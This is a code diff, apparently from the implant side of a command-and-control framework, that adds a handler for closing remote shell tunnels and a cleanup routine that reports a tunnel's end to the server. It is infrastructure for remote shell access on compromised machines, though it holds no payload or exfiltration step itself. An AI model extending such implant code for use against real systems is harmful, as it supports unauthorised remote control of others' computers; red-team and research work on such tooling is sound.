@@ -22,13 +22,28 @@ var (
 	tunnelHandlers = map[uint32]TunnelHandler{
 		pb.MsgShellReq: shellReqHandler,
 
-		pb.MsgTunnelData: tunnelDataHandler,
+		pb.MsgTunnelData:  tunnelDataHandler,
+		pb.MsgTunnelClose: tunnelCloseHandler,
 	}
 )
 
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
 	return tunnelHandlers
+}
+
+func tunnelCloseHandler(envelope *pb.Envelope, connection *transports.Connection) {
+	tunnelClose := &pb.TunnelClose{}
+	proto.Unmarshal(envelope.Data, tunnelClose)
+	tunnel := connection.Tunnel(tunnelClose.TunnelID)
+	if tunnel != nil {
+		// {{if .Debug}}
+		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
+		// {{end}}
+		connection.RemoveTunnel(tunnel.ID)
+		tunnel.Reader.Close()
+		tunnel.Writer.Close()
+	}
 }
 
 func tunnelDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
@@ -73,8 +88,23 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 		Data: shellResp,
 	}
 
+	// Cleanup function with arguments
+	cleanup := func(reason string) {
+		// {{if .Debug}}
+		log.Printf("Closing tunnel %d", tunnel.ID)
+		// {{end}}
+		connection.RemoveTunnel(tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&pb.TunnelClose{
+			TunnelID: tunnel.ID,
+			Err:      reason,
+		})
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgTunnelClose,
+			Data: tunnelClose,
+		}
+	}
+
 	go func() {
-		defer connection.RemoveTunnel(tunnel.ID)
 		for {
 			readBuf := make([]byte, readBufSize)
 			n, err := tunnel.Reader.Read(readBuf)
@@ -82,6 +112,7 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 				// {{if .Debug}}
 				log.Printf("Read EOF on tunnel %d", tunnel.ID)
 				// {{end}}
+				defer cleanup("EOF")
 				return
 			}
 			// {{if .Debug}}
